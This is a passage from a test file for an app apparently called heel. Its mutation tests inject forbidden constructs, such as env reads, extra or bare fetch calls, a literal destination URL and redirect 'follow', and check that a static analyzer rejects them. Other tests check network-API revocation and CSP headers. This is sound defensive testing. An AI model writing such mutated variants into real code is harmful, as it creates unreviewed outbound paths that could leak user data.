    ["defineProperty", statement('Object.defineProperty(input, "method", { value: "GET" });'), forbidden("defineProperty")],
    ["env", statement("const env = input;"), forbidden("env")],
    ["escaped env in a string", statement('const extra = "\\u0065nv";'), forbidden("env")],
    ["request", statement("const request = input;"), forbidden("request")],
    ["request in a comment", statement("// forward the caller request"), forbidden("request")],
    ["ASSETS", statement("const extra = input.binding.ASSETS;"), forbidden("ASSETS")],
    [
      "a second import",
      dispatch.replace(dispatchModuleImport, `${dispatchModuleImport}\nimport { deploymentConfig } from "../build/deployment-config";`),
      "imports anything but the shared origin validator",
    ],
    ["import(", statement('await import("../build/deployment-config");'), "dynamic import"],
    ["a second .fetch", dispatch.replace(sink, `    await input.binding.fetch(new Request(url, init));\n${sink}`), "exactly one binding guard read and one binding call"],
    ['a "https:// literal', statement('const extra = "https://heel.example";'), "literal destination"],
    ['redirect: "follow"', dispatch.replace('redirect: "manual"', 'redirect: "follow"'), "redirect mode is not exactly manual"],
    ["removal of pipeThrough", dispatch.replace("input.body!.pipeThrough(new FixedLengthStream(input.contentLength))", "input.body!"), "FixedLengthStream pipe"],
    // Further S1 syntax rules.
    ["export default", `${dispatch}\nexport default dispatchControlPlane;\n`, "default export"],
    ["class", statement("class Local {}"), "declares a class"],
    ["second function", statement("const local = () => input;"), "function other than dispatchControlPlane"],
    ["unlisted constructor", statement("const extra = new TransformStream();"), "constructs TransformStream"],
    ["computed member", statement('const extra = input["body"];'), "computed member access"],
  ];
  assert.equal(new Set(red.map(([label]) => label)).size, red.length);
  for (const [label, mutated, violation] of red) {
    assert.notEqual(mutated, dispatch, `${label} mutation did not apply`);
    const parsedMutation = ts.createSourceFile("dispatch.ts", mutated, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
    assert.equal(parsedMutation.parseDiagnostics.length, 0, `${label} mutation does not parse`);
    const violations = analyze(mutated);
    assert.ok(violations.some((found) => found.includes(violation)), `${label}: ${violations.join("\n")}`);
  }
  // Controls: a comment and a local read that name nothing forbidden stay accepted.
  for (const [label, unchanged] of [
    ["comment", statement("// The destination is now final.")],
    ["declared length read", dispatch.replace(sink, `    const declaredLength = input.contentLength;\n${sink}`)],
  ]) {
    assert.notEqual(unchanged, dispatch, `${label} control did not apply`);
    assert.deepEqual(analyze(unchanged), [], label);
  }
});


test("S3: the dispatch module bytes equal the reviewed pinned hash", async () => {
  const bytes = await readFile(new URL(CONTROL_PLANE_DISPATCH_PATH, appRoot)).catch(() => null);
  assert.notEqual(bytes, null, `${CONTROL_PLANE_DISPATCH_PATH} is absent`);
  assert.equal(createHash("sha256").update(bytes).digest("hex"), CONTROL_PLANE_DISPATCH_SHA256);
});


test("S4/S5: the worker reaches the private binding only through the one reviewed dispatch call", async () => {
  const worker = await source("worker/index.ts");
  const analyze = (text) => analyzeSource(join(appRootPath, "worker/index.ts"), text);
  assert.deepEqual(analyze(worker), []);
  const call = "  const outcome = await dispatchControlPlane({";
  const before = (code) => worker.replace(call, `  ${code}\n${call}`);
  const red = [
    ["binding fetch reinserted", before("await env.CONTROL_PLANE.fetch(new Request(new URL(upstreamPath, controlPlaneOrigin)));"), "names CONTROL_PLANE.fetch outside its one binding-shape guard"],
    ["binding guard removed", worker.replace(`  ${workerBindingGuard}\n`, ""), "binding-shape guard is not the first statement of proxyControlPlane"],
    [
      "binding guard after the request checks",
      worker.replace(`  ${workerBindingGuard}\n`, "").replace(call, `  ${workerBindingGuard}\n${call}`),
      "binding-shape guard is not the first statement of proxyControlPlane",
    ],
    ["binding guard accepts null", worker.replace("    || env.CONTROL_PLANE === null\n", ""), "binding-shape guard is not the first statement of proxyControlPlane"],
    ["computed binding fetch", before('await env.CONTROL_PLANE["fetch"](new Request(new URL(upstreamPath, controlPlaneOrigin)));'), 'reserved for the dispatch module: CONTROL_PLANE["fetch"]'],
    ["body pipe in the worker", before("request.body?.pipeThrough(new TransformStream());"), "reserved for the dispatch module: .pipeThrough("],
    ["bare fetch", before("await fetch(upstreamPath);"), "unreviewed fetch-shaped call"],
    ["binding argument substituted", worker.replace("    binding: env.CONTROL_PLANE,\n", "    binding: env.ASSETS,\n"), "not the one reviewed call in proxyControlPlane"],
    ["second dispatch call", before("await dispatchControlPlane({ binding: env.CONTROL_PLANE, publicOrigin: env.PUBLIC_ORIGIN, upstreamPath, method: request.method, headers: requestContract.headers, contentLength: requestContract.contentLength, body: request.body });"), "not the one reviewed call in proxyControlPlane"],
    ["dispatch captured", before("const send = dispatchControlPlane;"), "referenced outside its one reviewed call"],
    ["substitute dispatch module", worker.replace(dispatchImport, dispatchImport.replace("./control-plane-dispatch", "./control-plane-dispatch-copy")), "missing exact import { dispatchControlPlane }"],
  ];
  assert.equal(new Set(red.map(([label]) => label)).size, red.length);
  for (const [label, mutated, violation] of red) {
    assert.notEqual(mutated, worker, `${label} mutation did not apply`);
    const violations = analyze(mutated);
    assert.ok(violations.some((found) => found.includes(violation)), `${label}: ${violations.join("\n")}`);
  }
  // S5: the app-wide network-sink rule sees exactly one private sink, in the dispatch module.
  const files = await discoverOriginalSources(appRootPath);
  const dispatchPath = join(appRootPath, CONTROL_PLANE_DISPATCH_PATH);
  assert.ok(files.includes(dispatchPath), "source discovery does not include the dispatch module");
  for (const file of files) {
    const text = await readFile(file, "utf8");
    assert.equal(text.includes("input.binding.fetch("), file === dispatchPath, `${relative(appRootPath, file)} binding call`);
  }
});


test("recursive source discovery finds nested originals and excludes tests and vendor trees", async () => {
  const temporary = await mkdtemp(join(tmpdir(), "heel-privacy-walker-"));
  try {
    await mkdir(join(temporary, "app/deep/feature"), { recursive: true });
    await mkdir(join(temporary, "app/node_modules/vendor"), { recursive: true });
    await writeFile(join(temporary, "app/deep/feature/new-source.ts"), "export const value = 1;", "utf8");
    await writeFile(join(temporary, "app/deep/feature/new-source.test.ts"), "ignored", "utf8");
    await writeFile(join(temporary, "app/node_modules/vendor/hidden.ts"), "ignored", "utf8");

    const files = await discoverOriginalSources(temporary, ["app"]);
    assert.deepEqual(files.map((file) => relative(temporary, file)), [
      join("app", "deep", "feature", "new-source.ts"),
    ]);
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});


test("pins worker boot to same-origin runtime assets and revokes ambient network/package APIs", async () => {
  const worker = await source("workers/heel-review.worker.ts");

  assert.match(worker, /["']\/heel-runtime\/pyodide\.mjs["']/);
  assert.match(worker, /["']\/heel-runtime\/runtime-manifest\.json["']/);
  assert.match(worker, /crypto\.subtle\.digest\(["']SHA-256["']/);
  assert.match(worker, /wheel\.sha256/);
  assert.match(worker, /wheel\.size/);
  assert.match(worker, /unpackArchive/);
  assert.match(worker, /loadPackage/);
  assert.match(worker, /loadPackagesFromImports/);
  for (const capability of ["fetch", "XMLHttpRequest", "WebSocket", "EventSource"]) {
    assert.match(worker, new RegExp(`guard.*${capability}|${capability}.*guard`, "is"));
  }
  assert.match(worker, /MAX_BROWSER_RESULT_BYTES/);
  assert.doesNotMatch(worker, /https?:\/\/|unpkg|jsdelivr|pypi\.org|["']micropip["']|\/api\/review/i);
});


test("attaches a strict CSP and browser security headers to app and image responses", async () => {
  const worker = await source("worker/index.ts");

  assert.match(worker, /Content-Security-Policy/);
  for (const directive of [
    "default-src 'self'",
    "base-uri 'none'",
    "connect-src 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "object-src 'none'",
    "script-src 'self'",
    "worker-src 'self'",
    "'wasm-unsafe-eval'",
  ]) {
    assert.match(worker, new RegExp(directive.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  }
  assert.match(worker, /Referrer-Policy[^\n]+no-referrer/);
  assert.match(worker, /X-Content-Type-Options[^\n]+nosniff/);
  assert.match(worker, /X-Frame-Options[^\n]+DENY/);
  assert.match(worker, /Permissions-Policy/);
  assert.match(worker, /handleImageOptimization/);
  assert.match(worker, /withSecurityHeaders/);
  assert.doesNotMatch(worker, /connect-src[^;\n]*(https?:|\*)/);
  assert.doesNotMatch(worker, /worker-src[^;\n]*(https?:|\*)/);
});
